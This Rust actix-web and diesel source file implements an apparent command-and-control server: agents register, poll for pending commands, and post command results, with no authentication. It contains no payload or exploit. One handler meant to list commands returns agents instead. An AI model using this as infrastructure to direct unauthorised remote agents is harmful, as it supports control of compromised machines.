use super::DbPool;

use actix_web::{delete, get, post, put, web, Error, HttpResponse};
use diesel::prelude::*;

use crate::models::{
    Agents, CommandPayload, Commands, NewAgent, NewCommand, NewResult, ResultPayload, Results,
};

type DbError = Box<dyn std::error::Error + Send + Sync>;

#[get("/commands")]
async fn get_all_commands(pool: web::Data<DbPool>) -> Result<HttpResponse, Error> {
    let commands = web::block(move || {
        let conn = pool.get()?;
        find_all(&conn)
    })
    .await?
    .map_err(actix_web::error::ErrorInternalServerError)?;

    Ok(HttpResponse::Ok().json(commands))
}

#[post("/command")]
async fn post_command(
    pool: web::Data<DbPool>,
    payload: web::Json<CommandPayload>,
) -> Result<HttpResponse, Error> {
    let command = web::block(move || {
        let conn = pool.get()?;
        add_a_command(&payload.command, &payload.agent_id, &conn)
    })
    .await?
    .map_err(actix_web::error::ErrorInternalServerError)?;

    Ok(HttpResponse::Ok().json(command))
}

#[get("/command/{agentid}")]
async fn get_command_id(agentid: web::Path<i32>, pool: web::Data<DbPool>) -> Result<HttpResponse, Error> {
    let command = web::block(move || {
        let conn = pool.get()?;
        find_command(agentid.into_inner(), &conn)
    })
    .await?
    .map_err(actix_web::error::ErrorInternalServerError)?;

    Ok(HttpResponse::Ok().json(command))
}

#[post("/result")]
async fn post_result(
    payload: web::Json<ResultPayload>,
    pool: web::Data<DbPool>,
) -> Result<HttpResponse, Error> {
    let result = web::block(move || {
        let conn = pool.get()?;
        add_a_result(
            &payload.command_id,
            &payload.agent_id,
            &payload.result_content,
            &conn,
        )
    })
    .await?
    .map_err(actix_web::error::ErrorInternalServerError)?;

    Ok(HttpResponse::Ok().json(result))
}
#[get("/results")]
async fn get_all_results(pool: web::Data<DbPool>) -> Result<HttpResponse, Error> {
    let results = web::block(move || {
        let conn = pool.get()?;
        find_all_results(&conn)
    })
    .await?
    .map_err(actix_web::error::ErrorInternalServerError)?;

    Ok(HttpResponse::Ok().json(results))
}
#[get("/register")]
async fn get_register(pool: web::Data<DbPool>) -> Result<HttpResponse, Error> {
    let agent = web::block(move || {
        let conn = pool.get()?;
        add_an_agent(&conn)
    })
    .await?
    .map_err(actix_web::error::ErrorInternalServerError)?;

    Ok(HttpResponse::Ok().json(agent))
}

fn add_a_command(
    _command: &str,
    _agent_id: &i32,
    conn: &PgConnection,
) -> Result<Commands, DbError> {
    use crate::schema::commands::dsl::*;

    let new_command = NewCommand {
        command: _command,
        agent_id: _agent_id,
        created_at: chrono::Local::now().naive_local(),
    };

    let res = diesel::insert_into(commands)
        .values(&new_command)
        .get_result(conn)?;
    Ok(res)
}

fn find_all(conn: &PgConnection) -> Result<Vec<Agents>, DbError> {
    use crate::schema::agents::dsl::*;

    let items = agents.load::<Agents>(conn)?;
    Ok(items)
}

fn find_command(_agent_id: i32, conn: &PgConnection) -> Result<Option<Commands>, DbError> {
    use crate::schema::commands::dsl::*;

    let _command = commands
        .order(created_at.asc())
        .filter(agent_id.eq(_agent_id).and(done.eq(false)))
        .first::<Commands>(conn)
        .optional()?;

    Ok(_command)
}

fn add_an_agent(conn: &PgConnection) -> Result<Agents, DbError> {
    use crate::schema::agents::dsl::*;

    let new_agent = NewAgent {
        created_at: chrono::Local::now().naive_local(),
    };

    let res = diesel::insert_into(agents)
        .values(&new_agent)
        .get_result(conn)?;
    Ok(res)
}
fn add_a_result(
    _command_id: &i32,
    _agent_id: &i32,
    _result_content: &str,
    conn: &PgConnection,
) -> Result<Results, DbError> {
    use crate::schema::results::dsl::*;

    let new_result = NewResult {
        command_id: _command_id,
        agent_id: _agent_id,
        result_content: _result_content,
        done_at: chrono::Local::now().naive_local(),
    };

    let res = diesel::insert_into(results)
        .values(&new_result)
        .get_result(conn)?;
    update_command_status(_command_id, conn)?;
    Ok(res)
}
fn update_command_status(_command_id: &i32, conn: &PgConnection) -> Result<Commands, DbError> {
  use crate::schema::commands::dsl::*;

  let update_command = diesel::update(commands.find(_command_id))
    .set(done.eq(true))
    .get_result::<Commands>(conn)?;
  Ok(update_command)
}

fn find_all_results(conn: &PgConnection) -> Result<Vec<Results>, DbError> {
    use crate::schema::results::dsl::*;

    let items = results.load::<Results>(conn)?;
    Ok(items)
}
/* fn update_tweet(tweet_id: i32, _message: String, conn: &PgConnection) -> Result<Tweet, DbError> {
  use crate::schema::tweets::dsl::*;

  let tweet = diesel::update(tweets.find(tweet_id))
    .set(message.eq(_message))
    .get_result::<Tweet>(conn)?;
  Ok(tweet)
}

fn delete_tweet(tweet_id: i32, conn: &PgConnection) -> Result<usize, DbError> {
  use crate::schema::tweets::dsl::*;

  let count = diesel::delete(tweets.find(tweet_id)).execute(conn)?;
  Ok(count)
} */
